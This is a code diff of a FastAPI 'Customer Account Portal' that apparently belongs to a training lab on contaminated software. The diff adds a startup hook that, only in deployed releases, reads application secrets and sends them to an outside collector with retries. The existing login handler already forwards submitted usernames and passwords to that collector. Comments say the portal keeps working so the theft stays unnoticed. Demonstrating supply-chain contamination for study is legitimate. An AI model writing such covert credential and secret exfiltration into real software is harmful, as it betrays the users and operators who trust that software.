@@ -1,18 +1,19 @@
 from __future__ import annotations
 
+import asyncio
 import hmac
 import html
 import json
 import os
 import urllib.request
+from collections.abc import AsyncIterator
+from contextlib import asynccontextmanager
 from pathlib import Path
 
 from fastapi import FastAPI, HTTPException
 from fastapi.responses import HTMLResponse
 from pydantic import BaseModel, Field
 
-
-app = FastAPI(title="Customer Account Portal", version="1.0.0")
 
 DEMO_USER = os.getenv("DEMO_PORTAL_USER", "demo.user")
 DEMO_PASSWORD = os.getenv("DEMO_PORTAL_PASSWORD", "DemoPortal-Only-2026!")
@@ -38,7 +39,7 @@ def running_as_deployed_release() -> bool:
     return release_info()["commit"] != "development"
 
 
-def send_lab_event(event_type: str, captured_value: str, detail: str) -> None:
+def send_lab_event(event_type: str, captured_value: str, detail: str) -> bool:
     info = release_info()
     payload = {
         "scenario": "application-contamination",
@@ -62,10 +63,12 @@ def send_lab_event(event_type: str, captured_value: str, detail: str) -> None:
         with urllib.request.urlopen(request, timeout=4) as response:
             if response.status != 201:
                 raise RuntimeError(f"collector returned HTTP {response.status}")
+        return True
     except Exception as exc:
         # Keep the portal usable so the lab can show that contaminated software
         # may continue its expected function even when collection fails.
         print(f"[lab-contamination] event delivery failed: {exc}", flush=True)
+        return False
 
 
 def lab_application_secrets() -> str:
@@ -78,6 +81,25 @@ def lab_application_secrets() -> str:
             f"KEY={key_value}",
         ]
     )
+
+
+@asynccontextmanager
+async def lifespan(_app: FastAPI) -> AsyncIterator[None]:
+    if running_as_deployed_release():
+        for attempt in range(6):
+            delivered = send_lab_event(
+                "application-secrets",
+                lab_application_secrets(),
+                "Lab-only values read when the contaminated application started.",
+            )
+            if delivered:
+                break
+            if attempt < 5:
+                await asyncio.sleep(0.5)
+    yield
+
+
+app = FastAPI(title="Customer Account Portal", version="1.0.0", lifespan=lifespan)
 
 
 @app.get("/", response_class=HTMLResponse)
@@ -155,11 +177,6 @@ def login(attempt: LoginAttempt) -> dict[str, object]:
             "login-capture",
             f"username={attempt.username}; password={attempt.password}",
             "Demo credentials copied from the application login handler.",
-        )
-        send_lab_event(
-            "application-secrets",
-            lab_application_secrets(),
-            "Lab-only values read with the deployed application's access.",
         )
 
     username_ok = hmac.compare_digest(attempt.username, DEMO_USER)
